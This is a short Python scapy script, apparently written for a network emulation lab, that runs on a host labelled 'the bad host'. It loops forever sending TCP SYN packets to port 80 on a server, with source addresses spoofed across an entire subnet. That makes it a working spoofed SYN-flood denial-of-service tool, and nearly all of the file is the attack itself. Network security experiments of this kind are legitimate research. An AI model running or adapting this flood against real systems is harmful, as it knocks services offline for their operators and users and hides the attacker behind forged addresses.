#!/usr/bin/env python
from __future__ import print_function
import os
import argparse
import sys
import socket
import random
import struct
import logging as log

from scapy.all import *
import time
import re

host = 'he2' # the bad host
START_IP = 0 # 0=spoof whole subnet range, 2=skip the client ip 10.0.3.1

if '--local' in sys.argv:
    print('start on remote...')
    from subprocess import call
    cmd = ["mx", host, 'python', sys.argv[0]]
    call(cmd)
    exit(0)
else:
    print('On %s and spoofing he3: let\'s go' % host)

ip_base = '10.0.3.' # spoof for he3
ser_ip = '10.0.4.4'
phases = 5

eth = Ether(src='00:00:0a:00:04:02', dst='00:00:0a:00:04:04') # macs of he2 and ser

phase = 0
while True:
    print('phase ' + str(phase+1))
    for i in range(START_IP,256):
        packet = eth/IP(src=ip_base + str(i), dst=ser_ip)/TCP(sport=RandShort(), dport=80, flags="S")
        print('.', end='')
        sys.stdout.flush() # print point immediately
        sendp(packet, verbose=0)
    print('')
    phase += 1
